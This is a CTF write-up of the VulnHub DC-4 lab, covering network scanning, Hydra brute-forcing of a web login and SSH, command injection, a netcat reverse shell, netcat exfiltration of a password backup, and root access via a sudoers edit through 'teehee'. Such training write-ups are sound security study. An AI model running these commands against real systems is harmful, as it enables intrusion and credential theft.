<div align="center">

# 🔐 `DC-4`

### 𝚅𝚄𝙻𝙽𝙷𝚄𝙱 • 𝙲𝚃𝙵 𝚆𝚁𝙸𝚃𝙴-𝚄𝙿

![Platform](https://img.shields.io/badge/Platform-VulnHub-8A2BE2?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-111111?style=for-the-badge&logo=linux)
![Status](https://img.shields.io/badge/Status-Rooted-00C853?style=for-the-badge)

`RECONNAISSANCE` • `EXPLOITATION` • `PRIVILEGE ESCALATION`

</div>

---

## 📌 `Overview`

**DC-4** is an intentionally vulnerable machine from VulnHub that I completed as part of my offensive security practice.

The lab involved **network enumeration, web directory discovery, credential attacks, command injection, reverse shells, SSH access, and Linux privilege escalation.**

> [!NOTE]
> This write-up documents work performed in an intentionally vulnerable CTF/lab environment for educational purposes.

---

## 🔎 `01. Network Enumeration`

I started by identifying the target machine on the local network.

```bash
sudo -i
nmap -sN 192.168.56.0/24
```

The scan identified the target as:

```text
192.168.56.108
```

### Discovered Services

`HTTP` • `SSH`

---

## 🌐 `02. Web Enumeration`

I enumerated the web server to identify hidden files and directories.

### Feroxbuster

```bash
feroxbuster -u http://192.168.56.108 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Alternatively:

```bash
dirb http://192.168.56.108
```

The enumeration revealed a **login page**, providing a potential entry point into the application.

---

## 🔑 `03. Credential Discovery`

I used **Hydra** with the `rockyou.txt` wordlist against the login form.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.108 http-post-form "/login.php:username=^USER^&password=^PASS^:S=logout"
```

### 🎯 Result

```text
Username : admin
Password : happy
```

The discovered credentials allowed access to the web application.

---

## 💻 `04. Command Injection`

After authentication, I discovered functionality that allowed commands to be executed.

I intercepted the request using **Burp Suite** and sent it to **Repeater** for further testing.

```text
radio=ls+-l;id&submit=Run
```

Adding `;id` confirmed that additional operating-system commands could be executed.

> [!IMPORTANT]
> At this point, command execution on the target had been confirmed.

---

## 🔄 `05. Reverse Shell`

After confirming command injection, I started a Netcat listener on my Kali machine.

```bash
sudo nc -nlvp 5555
```

The following command was then used through the vulnerable functionality:

```bash
nc -e /bin/bash 192.168.56.107 5555
```

This successfully returned a shell.

### Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 👥 `06. User Enumeration`

I began enumerating the local system:

```bash
cd /home
ls -ah
```

Three users were identified:

```text
charles
jim
sam
```

Further enumeration of the user directories revealed interesting files under **Jim's account**, including a backup containing old passwords.

---

## 📂 `07. Credential Extraction`

The discovered password file was transferred to my Kali machine using Netcat.

### Target

```bash
cat old-passwords.bak | nc 192.168.56.107 6666
```

### Kali

```bash
sudo nc -nlvp 6666 > old-passwords.bak
```

I then tested the password list against Jim's SSH account:

```bash
hydra -l jim -P old-passwords.bak ssh://192.168.56.108
```

### 🎯 Valid Credentials

```text
Username : jim
Password : jibril04
```

---

## 🔀 `08. Lateral Movement`

I connected to the target through SSH:

```bash
ssh jim@192.168.56.108
```

During enumeration of Jim's account, I checked the local mailbox:

```bash
mail
```

The mailbox contained credentials belonging to another user — **Charles**.

Those credentials allowed me to move from:

```text
www-data  ➜  jim  ➜  charles
```

---

## 🚀 `09. Privilege Escalation`

After accessing **Charles's account**, I investigated the available elevated privileges.

The `teehee` utility could be executed with elevated privileges and used to modify the sudoers configuration.

```bash
echo 'charles ALL=(ALL) NOPASSWD:ALL' | sudo teehee -a /etc/sudoers
```

I then executed:

```bash
sudo /bin/bash
```

And verified the current user:

```bash
whoami
```

### 🚩 Result

```text
root
```

---

## 🏁 `10. Root Access`

After obtaining root privileges:

```bash
cd /root
ls
```

**Root access was successfully achieved and the final flag was obtained.** 🚩

---

## 🧠 `Key Takeaways`

Through DC-4, I gained hands-on experience with:

- 🔍 Network & service enumeration
- 🌐 Web directory enumeration
- 🔑 Credential attacks
- 🛠️ Burp Suite request manipulation
- 💻 Command injection
- 🔄 Reverse shells
- 👥 Linux user enumeration
- 🔀 Lateral movement
- 🔐 SSH enumeration
- ⬆️ Linux privilege escalation
- ⚠️ Misconfigured sudo permissions

> [!TIP]
> DC-4 demonstrated how several relatively small security weaknesses can be chained together to progress from web application access to complete root-level compromise.

---

<div align="center">

### `DC-4 // ROOTED ✓`

`NMAP` • `HYDRA` • `BURP SUITE` • `NETCAT` • `SSH` • `LINUX PRIVESC`

---

<sub>⚠️ For educational purposes and authorized security testing only.</sub>

</div>
